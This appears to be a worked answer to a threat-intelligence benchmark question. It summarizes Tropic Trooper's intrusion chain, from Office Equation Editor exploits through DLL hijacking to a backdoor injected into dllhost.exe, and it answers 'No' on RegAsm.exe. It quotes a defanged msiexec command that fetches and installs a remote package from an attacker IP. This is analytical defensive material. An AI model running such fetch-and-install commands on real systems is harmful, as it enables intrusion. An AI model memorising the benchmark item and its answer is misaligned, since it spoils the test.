### Step-by-Step Analysis

#### 1. Analyze the CTI Report

**Initial Access:**
- Tropic Trooper used exploits for CVE-2017-11882 or CVE-2018-0802 to execute commands.
- They downloaded and installed an installer package (.msi) using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.

**Execution:**
- The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) and then deleted itself.
- UserInstall.exe dropped:
  - A normal sidebar.exe file (a Windows Gadget tool).
  - A malicious loader (in "C:\ProgramData\Apple\Update\wab32res.dll").
  - An encrypted configuration file.
- UserInstall.exe used BITSadmin to create a job and launch sidebar.exe.
- The malicious loader used DLL hijacking on sidebar.exe and launched dllhost.exe.
- The loader injected a DLL backdoor into dllhost.exe.

**Persistence:**
- The backdoor decrypts the configuration file and uses SSL to connect to C&C servers.

**Command and Control:**
- TClient, a backdoor, uses custom SSL libraries to connect to the C&C server.
- The C&C server and configuration values are not hardcoded, allowing for easy updates.

**Others:**
- Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware.
- The MSI file drops three files and creates a hidden directory (UFile) in C:\ProgramData\Apple\Update\.
- The backdoor uses DLL hijacking to evade AV detection.

#### 2. Analyze the Question

**Question:**
- After using Equation Editor exploits to execute an installer package with malicious payloads, is Tropic Trooper likely to drop RegAsm.exe onto systems for performing malicious activity before injecting a malicious DLL backdoor into dllhost.exe to facilitate their attack?

**Answer Choices:**
- A: Yes
- B: No

#### 3. Compare and Evaluate

**Extracted Attack Sequence:**
1. **Initial Access:**
   - Exploit CVE-2017-11882 or CVE-2018-0802.
   - Download and install an installer package (.msi).

2. **Execution:**
   - Drop and execute UserInstall.exe.
   - UserInstall.exe drops:
     - sidebar.exe.
     - wab32res.dll (malicious loader).
     - Encrypted configuration file.
   - Use BITSadmin to launch sidebar.exe.
   - The malicious loader uses DLL hijacking on sidebar.exe.
   - Launch dllhost.exe.
   - Inject a DLL backdoor into dllhost.exe.

**Evaluation of Answer Choices:**
- **A: Yes**
  - The question suggests that Tropic Trooper drops RegAsm.exe before injecting a DLL backdoor into dllhost.exe.
  - However, the CTI report does not mention RegAsm.exe at any point in the attack sequence.
  - The report focuses on the use of DLL hijacking and the injection of a DLL backdoor into dllhost.exe, but does not indicate the use of RegAsm.exe.

- **B: No**
  - The CTI report does not mention RegAsm.exe.
  - The sequence described in the report does not include the use of RegAsm.exe before the injection of the DLL backdoor into dllhost.exe.

#### 4. Final Answer

**Final Answer: B: No**

**Reasoning:**
- The CTI report provides a detailed sequence of the attack, including the use of Equation Editor exploits, the installation of an MSI package, the execution of UserInstall.exe, the dropping of various files, and the injection of a DLL backdoor into dllhost.exe.
- There is no mention of RegAsm.exe in the report, and the sequence of actions described does not include the use of RegAsm.exe before the injection of the DLL backdoor.
- Therefore, it is unlikely that Tropic Trooper would drop RegAsm.exe onto systems for performing malicious activity before injecting a malicious DLL backdoor into dllhost.exe.
